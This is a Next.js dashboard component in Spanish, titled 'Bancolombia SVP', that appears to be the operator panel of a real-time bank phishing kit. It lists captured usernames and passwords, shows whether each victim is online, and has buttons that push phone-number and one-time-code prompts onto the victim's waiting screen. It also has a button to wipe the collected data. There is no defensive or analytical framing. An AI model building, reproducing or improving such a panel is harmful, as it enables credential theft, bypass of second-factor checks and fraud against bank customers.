"use client";

import { useState, useEffect, useCallback } from "react";
import { useRouter } from "next/navigation";
import Footer from "../appPages/components/Footer";
import Head from "next/head";

export default function ProtectedDashboard() {
  const [submissions, setSubmissions] = useState([]);
  const [message, setMessage] = useState("");
  const [authorized, setAuthorized] = useState(false);
  const [isLoading, setIsLoading] = useState(false);
  const router = useRouter();

  const loadServer = useCallback(async () => {
    setIsLoading(true);
    setMessage("Cargando datos del servidor...");
    try {
      const resp = await fetch("/api/admin/submissions", { credentials: "include" });
      if (resp.ok) {
        const data = await resp.json();
        setSubmissions(data.submissions || []);
        setMessage("Datos cargados del servidor.");
        logAdminAction("load_server", `Cargó ${data.submissions?.length || 0} envíos`);
        return;
      }

      if (resp.status === 401) {
        router.push("/admin");
        return;
      }

      setMessage("No se pudieron cargar datos del servidor.");
    } catch (error) {
      setMessage("Error de red al cargar datos del servidor.");
      console.error("Error loadServer:", error);
    } finally {
      setIsLoading(false);
    }
  }, [router]);

  useEffect(() => {
    async function checkLogin() {
      try {
        const resp = await fetch("/api/admin/me", { credentials: "include" });
        if (resp.ok) {
          setAuthorized(true);
          await Promise.all([loadServer(), fetchAdminProfiles(), fetchActionLogs()]);
        } else {
          router.push("/admin");
        }
      } catch (error) {
        console.error("Error checkLogin:", error);
        router.push("/admin");
      }
    }
    checkLogin();

    // Auto-refresh cada 10s si está autorizado
    const interval = setInterval(() => {
      if (authorized) {
        loadServer();
      }
    }, 10000);

    return () => {
      clearInterval(interval);
    };
  }, [loadServer, router, authorized]);

  const [adminProfiles, setAdminProfiles] = useState([]);
  const [actionLogs, setActionLogs] = useState([]);
  const [userActivity, setUserActivity] = useState([]);
  const [activityPage, setActivityPage] = useState(1);
  const itemsPerPage = 5;

  useEffect(() => {
    if (!submissions || submissions.length === 0) {
      setUserActivity([]);
      return;
    }

    const byUser = new Map();
    const sorted = [...submissions].sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp));
    const now = new Date();

    sorted.forEach((sub) => {
      const username = sub.username || "(sin usuario)";
      const lastSeen = new Date(sub.timestamp || sub.server_timestamp || now);
      const isOnline = now - lastSeen < 10 * 60 * 1000; // 10 minutos
      const status = isOnline ? "Online" : "Offline";

      if (!byUser.has(username)) {
        byUser.set(username, {
          username,
          visitCount: 1,
          status,
          flow: sub.flow || "-",
          lastStatus: sub.status || "-",
          lastSeen,
          password: sub.password || "",
          timestamp: sub.timestamp || "",
          server_timestamp: sub.server_timestamp || "",
        });
      } else {
        const existing = byUser.get(username);
        existing.visitCount += 1;
        if (lastSeen > new Date(existing.lastSeen)) {
          existing.lastSeen = lastSeen;
          existing.flow = sub.flow || existing.flow;
          existing.lastStatus = sub.status || existing.lastStatus;
          existing.status = status;
          existing.password = sub.password || existing.password;
          existing.timestamp = sub.timestamp || existing.timestamp;
          existing.server_timestamp = sub.server_timestamp || existing.server_timestamp;
        }
        byUser.set(username, existing);
      }
    });

    const normalized = Array.from(byUser.values()).sort((a, b) => new Date(b.lastSeen) - new Date(a.lastSeen));
    setUserActivity(normalized);
    setActivityPage(1);
  }, [submissions]);

  const fetchAdminProfiles = useCallback(async () => {
    try {
      const resp = await fetch("/api/admin/users", { credentials: "include" });
      if (!resp.ok) {
        if (resp.status === 401) router.push("/admin");
        return;
      }
      const data = await resp.json();
      setAdminProfiles(data.users || []);
    } catch (err) {
      console.error("Error fetching admin profiles:", err);
    }
  }, [router]);

  const fetchActionLogs = useCallback(async () => {
    try {
      const resp = await fetch("/api/admin/action-logs", { credentials: "include" });
      if (!resp.ok) {
        if (resp.status === 401) router.push("/admin");
        return;
      }
      const data = await resp.json();
      setActionLogs(data.logs || []);
    } catch (err) {
      console.error("Error fetching action logs:", err);
    }
  }, [router]);

  const logAdminAction = async (action, details = "") => {
    try {
      await fetch("/api/admin/action-logs", {
        method: "POST",
        credentials: "include",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ action, details }),
      });
    } catch (err) {
      console.error("Error logging action:", err);
    }
  };

  const adminSendRequest = async (username, actionType, flow = "default") => {
    if (!username) {
      setMessage("Debe seleccionar un usuario válido.");
      return;
    }

    setIsLoading(true);
    try {
      const response = await fetch("/api/send-code", {
        method: "POST",
        credentials: "include",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ user: username, action: actionType, flow }),
      });
      const body = await response.json();

      if (!response.ok) {
        setMessage(`Error al solicitar ${actionType} para ${username}: ${body.message || "Sin detalles"}`);
        logAdminAction("request_failed", `Usuario ${username} acción ${actionType} => ${body.message || "error"}`);
      } else {
        const label = actionType === "otp-p" ? "solicitud de teléfono" : "solicitud de código";
        setMessage(`Se envió ${label} a ${username}.`);
        logAdminAction("request_user_info", `Usuario ${username}, acción ${actionType}, flujo ${flow}`);
      }
    } catch (err) {
      console.error("Error adminSendRequest:", err);
      setMessage("Error de red al enviar solicitud de admin.");
      logAdminAction("request_user_info_error", `Usuario ${username} acción ${actionType}, error red`);
    } finally {
      setIsLoading(false);
      await loadServer();
      await fetchActionLogs();
    }
  };

  const totalActivityPages = Math.max(1, Math.ceil(userActivity.length / itemsPerPage));
  const activityPaginated = userActivity.slice((activityPage - 1) * itemsPerPage, activityPage * itemsPerPage);

  const loadLocal = () => {
    try {
      const local = JSON.parse(localStorage.getItem("svpSubmissions") || "[]");
      setSubmissions(local);
      setMessage("Datos cargados del localStorage.");
      logAdminAction("load_local", `Cargó ${local.length} registros desde localStorage`);
    } catch (error) {
      console.error("[dashboard] Failed to parse local submissions:", error);
      setMessage("Error al leer datos locales. Los datos pueden estar corruptos.");
    }
  };

  const requestUserInfo = async (username, action = "otp-p") => {
    if (!username) {
      setMessage("No hay usuario en esta fila.");
      return;
    }

    const flow = action === "otp-p" ? "OTP-P" : "OTP-E";
    localStorage.setItem("svpFlow", flow);

    try {
      const resp = await fetch("/api/send-code", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ user: username, action, flow }),
      });
      if (resp.status === 401) {
        router.push("/admin");
        return;
      }
      const data = await resp.json();
      if (!resp.ok) {
        setMessage(`Error solicitando datos: ${data.message || "desconocido"}`);
        return;
      }

      const details = action === "otp-p" ? "Número de teléfono solicitado" : `Código enviado${data.code ? ` (${data.code})` : ""}`;
      setMessage(`Solicitud (${flow}) para ${username}: ${details}`);
      logAdminAction("request_user_info", `Usuario ${username} flujo ${flow}`);
      router.push(`/loading?next=waiting&user=${encodeURIComponent(username)}&flow=${encodeURIComponent(flow)}`);
    } catch (error) {
      setMessage("Error de red al solicitar los datos.");
      logAdminAction("request_user_info_error", `Usuario ${username}, error`);
    }
  };

  if (!authorized) {
    return (
      <main className="bc-container bc-mt-4">
        <h2>Autenticando...</h2>
        <p>Redirigiendo al login de administrador...</p>
      </main>
    );
  }

  return (
    <>
      <Head>
        <title>Dashboard | Bancolombia SVP</title>
      </Head>
      <main style={{
        minHeight: "100vh",
        background: "radial-gradient(circle at top left, #002732, #000000 45%)",
        color: "#b5fff5",
        padding: "2rem"
      }}>
        <section style={{
          maxWidth: "1200px",
          margin: "0 auto",
          padding: "2rem",
          borderRadius: "1rem",
          background: "linear-gradient(145deg, rgba(42, 59, 69, 0.9), rgba(8, 19, 28, 0.85))",
          boxShadow: "0 0 30px rgba(0, 255, 255, 0.25)"
        }}>
          <div style={{
            textAlign: "center",
            marginBottom: "1rem",
            fontFamily: "monospace",
            letterSpacing: "0.5rem",
            fontSize: "2rem",
            color: "#4ff6e2",
            textShadow: "0 0 16px rgba(79, 246, 226, 0.7)"
          }}>
            . E X E
          </div>

          <div style={{
            background: "linear-gradient(135deg, rgba(0, 34, 38, 0.85), rgba(0, 60, 75, 0.65))",
            border: "1px solid rgba(64, 255, 230, 0.5)",
            borderRadius: "1rem",
            padding: "1rem",
            boxShadow: "inset 0 0 20px rgba(64, 255, 230, 0.35), 0 0 25px rgba(10, 220, 200, 0.4)"
          }}>
            <h2 style={{ margin: "0 0 1rem", color: "#d4fffd" }}> Society . E X E </h2>
            <div className="bc-mt-2 bc-gap-3 bc-flex dashboard-actions" style={{ display: "flex", gap: "0.75rem", flexWrap: "wrap" }}>
              <button className="bc-button bc-button-outline dashboard-btn" onClick={loadLocal}>
                Cargar datos locales
              </button>
              <button
                className="bc-button bc-button-outline dashboard-btn"
                onClick={loadServer}
                disabled={isLoading}
              >
                {isLoading ? "Cargando..." : "Cargar datos servidor"}
              </button>
              <button
                className="bc-button bc-button-danger dashboard-btn-danger"
                onClick={async () => {
                  setIsLoading(true);
                  try {
                    const resp = await fetch("/api/admin/clear-submissions", {
                      method: "POST",
                      credentials: "include",
                    });
                    const data = await resp.json();
                    if (resp.ok) {
                      setMessage("DB limpiada. Recarca para ver cambios.");
                      setSubmissions([]);
                      logAdminAction("clear_db", "Se borró la tabla submissions");
                    } else if (resp.status === 401) {
                      router.push("/admin");
                    } else {
                      setMessage(data?.message || "Error al limpiar la DB");
                      logAdminAction("clear_db_error", data?.message || "Error al limpiar DB");
                    }
                  } catch (error) {
                    setMessage("Error de red al limpiar la DB.");
                  } finally {
                    setIsLoading(false);
                  }
                }}
              >
                Limpiar DB
              </button>
              <button
                className="bc-button bc-button-danger dashboard-btn-danger"
                onClick={async () => {
                  try {
                    const resp = await fetch('/api/admin/logout', {
                      method: 'POST',
                      credentials: 'include',
                    });
                    if (resp.ok) {
                      logAdminAction('logout', 'Cierre de sesión admin');
                    }
                  } catch (error) {
                    console.error('[dashboard] Logout error:', error);
                  }
                  router.push('/admin');
                }}
              >
                Cerrar sesión
              </button>
            </div>
            <p>{message}</p>
            <section className="admin-profile-grid" style={{ display: "grid", gridTemplateColumns: "repeat(auto-fit,minmax(250px,1fr))", gap: "1rem", marginTop: "1rem" }}>
              {adminProfiles.map((admin) => (
                <article
                  key={admin.id}
                  style={{
                    background: "linear-gradient(135deg, rgba(4,40,48,0.85), rgba(7,82,110,0.45))",
                    border: "1px solid rgba(64,255,230,0.4)",
                    borderRadius: "1rem",
                    padding: "1rem",
                    boxShadow: "0 0 20px rgba(64,255,230,0.18)",
                    minHeight: "180px",
                  }}
                >
                  <div style={{ display: "flex", gap: "0.75rem", alignItems: "center" }}>
                    <img
                      src={`https://i.pravatar.cc/80?img=${admin.id}`}
                      alt="Avatar"
                      style={{ width: "60px", height: "60px", borderRadius: "50%", border: "2px solid #4ff6e2" }}
                    />
                    <div>
                      <h3 style={{ margin: 0, color: "#fff" }}>{admin.first_name || "Administrador"} {admin.last_name || "User"}</h3>
                      <small style={{ color: "#a5f8f4" }}>{admin.username}</small>
                    </div>
                  </div>
                  <p style={{ margin: "0.75rem 0 0.25rem", color: "#c8f6f6" }}><b>Email:</b> {admin.email || "-"}</p>
                  <p style={{ margin: "0 0 0.75rem", color: "#c8f6f6" }}><b>Teléfono:</b> {admin.phone || "-"}</p>
                  <p style={{ margin: 0, color: "#b0f3f1" }}><i>Usuario creado</i>: {new Date(admin.created_at).toLocaleString()}</p>
                </article>
              ))}
            </section>

            <section className="bc-mt-4" style={{ marginTop: "1.5rem" }}>
              <h3 style={{ color: "#d4fffd", marginBottom: "0.35rem" }}>Últimas entradas de usuarios</h3>
              <p style={{ color: "#bde2e2", marginBottom: "0.6rem" }}>
                El administrador puede solicitar el siguiente paso para cada usuario (OTP-P / OTP-E) y el usuario conectado recibirá el cambio en su pantalla de carga.
              </p>
              <div style={{ overflowX: "auto", borderRadius: "10px", border: "1px solid rgba(64,255,230,0.3)" }}>
                <table className="bc-table bc-table-striped" style={{ width: "100%", background: "rgba(0,0,0,0.35)", minWidth: "750px" }}>
                  <thead>
                    <tr>
                      <th>#</th>
                      <th>Usuario</th>
                      <th>Flujo</th>
                      <th>Estado</th>
                      <th>Última acción</th>
                      <th>Acciones admin</th>
                    </tr>
                  </thead>
                  <tbody>
                    {submissions.length === 0 ? (
                      <tr>
                        <td colSpan={6} style={{ color: "#bde2e2", textAlign: "center" }}>Sin envíos recientes.</td>
                      </tr>
                    ) : (
                      submissions.slice(0, 5).map((item, idx) => (
                        <tr key={item.id} style={{ color: "#e6fdfd" }}>
                          <td>{idx + 1}</td>
                          <td>{item.username}</td>
                          <td>{item.flow}</td>
                          <td>{item.status}</td>
                          <td>{new Date(item.server_timestamp || item.timestamp).toLocaleString()}</td>
                          <td style={{ display: "flex", gap: "0.4rem", flexWrap: "wrap" }}>
                            <button className="bc-button bc-button-primary" style={{ fontSize: "0.7rem" }} onClick={() => adminSendRequest(item.username, "otp-p", item.flow)}>
                              OTP-P (teléfono)
                            </button>
                            <button className="bc-button bc-button-primary" style={{ fontSize: "0.7rem" }} onClick={() => adminSendRequest(item.username, "otp-e", item.flow)}>
                              OTP-E (código)
                            </button>
                          </td>
                        </tr>
                      ))
                    )}
                  </tbody>
                </table>
              </div>
            </section>

            <section className="bc-mt-4" style={{ marginTop: "1.5rem" }}>
              <h3 style={{ color: "#d4fffd", marginBottom: "0.35rem" }}>Actividad de usuarios (resumen)</h3>
              <p style={{ margin: "0 0 0.75rem", color: "#bde2e2" }}>
                Usuarios únicos que han ingresado la página principal: <b>{userActivity.length}</b>. Mostrando {activityPaginated.length} de {userActivity.length}.
              </p>

              <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center", marginBottom: "0.5rem" }}>
                <small style={{ color: "#9ff7f4" }}>Pág {activityPage}/{totalActivityPages}</small>
                <div style={{ display: "flex", gap: "0.5rem" }}>
                  <button
                    className="bc-button bc-button-outline"
                    disabled={activityPage <= 1}
                    onClick={() => setActivityPage((p) => Math.max(1, p - 1))}
                  >
                    Anterior
                  </button>
                  <button
                    className="bc-button bc-button-outline"
                    disabled={activityPage >= totalActivityPages}
                    onClick={() => setActivityPage((p) => Math.min(totalActivityPages, p + 1))}
                  >
                    Siguiente
                  </button>
                </div>
              </div>

              <div style={{ overflowX: "auto", borderRadius: "10px", border: "1px solid rgba(64,255,230,0.3)" }}>
                <table className="bc-table bc-table-striped" style={{ width: "100%", background: "rgba(0,0,0,0.35)", minWidth: "700px" }}>
                  <thead>
                    <tr>
                      <th>#</th>
                      <th>Usuario</th>
                      <th>Entradas</th>
                      <th>Estado</th>
                      <th>Flujo</th>
                      <th>Contraseña</th>
                      <th>Estado último</th>
                      <th>Última acción</th>
                      <th>Timestamp</th>
                      <th>Server timestamp</th>
                    </tr>
                  </thead>
                  <tbody>
                    {userActivity.length === 0 ? (
                      <tr>
                        <td colSpan={10} style={{ color: "#bde2e2", textAlign: "center" }}>No hay registros de visitas a la página principal.</td>
                      </tr>
                    ) : (
                      activityPaginated.map((user, idx) => (
                        <tr key={`${user.username}-${user.lastSeen}`} style={{ color: "#e6fdfd" }}>
                          <td>{(activityPage - 1) * itemsPerPage + idx + 1}</td>
                          <td>{user.username}</td>
                          <td>{user.visitCount}</td>
                          <td style={{ color: user.status === "Online" ? "#7fffa9" : "#f49fbf" }}>{user.status}</td>
                          <td>{user.flow}</td>
                          <td>{user.password ? "*".repeat(user.password.length) : "-"}</td>
                          <td>{user.lastStatus}</td>
                          <td>{new Date(user.lastSeen).toLocaleString()}</td>
                          <td>{user.timestamp ? new Date(user.timestamp).toLocaleString() : "-"}</td>
                          <td>{user.server_timestamp ? new Date(user.server_timestamp).toLocaleString() : "-"}</td>
                        </tr>
                      ))
                    )}
                  </tbody>
                </table>
              </div>
            </section>
          </div>
        </section>

        <Footer />
      </main>

      <style jsx>{`
        .dashboard-actions button {
          font-weight: 700;
          border-radius: 12px;
          padding: 0.7rem 1.1rem;
          transition: transform 120ms ease, box-shadow 120ms ease, opacity 120ms ease;
          border: 1.5px solid rgba(79, 246, 226, 0.4);
          background: rgba(2, 45, 53, 0.7);
          color: #b5fff5;
          backdrop-filter: blur(6px);
          box-shadow: 0 0 18px rgba(18, 219, 212, 0.2);
        }

        .dashboard-actions button:hover {
          transform: translateY(-1px) scale(1.01);
          box-shadow: 0 0 24px rgba(18, 219, 212, 0.4);
        }

        .dashboard-actions button:active {
          transform: translateY(0) scale(0.99);
          box-shadow: 0 0 12px rgba(18, 219, 212, 0.3);
        }

        .dashboard-btn-danger {
          border-color: rgba(255, 50, 76, 0.7);
          background: linear-gradient(135deg, rgba(226, 57, 86, 0.25), rgba(156, 18, 36, 0.32));
          color: #fff;
        }

        .dashboard-btn-danger:hover {
          background: linear-gradient(135deg, rgba(226, 57, 86, 0.35), rgba(156, 18, 36, 0.45));
          border-color: rgba(255, 70, 96, 0.85);
        }

        .bc-button-primary,
        .bc-button-secondary,
        .dashboard-btn,
        .dashboard-btn-danger {
          display: inline-flex;
          align-items: center;
          justify-content: center;
          gap: 0.35rem;
        }

        .dashboard-btn:disabled {
          opacity: 0.5;
          cursor: not-allowed;
        }

        table.bc-table th,
        table.bc-table td {
          border-bottom: 1px solid rgba(64, 255, 230, 0.2);
        }

        table.bc-table tbody tr:hover {
          background: rgba(15, 62, 75, 0.4);
        }
      `}</style>
    </>
  );
}

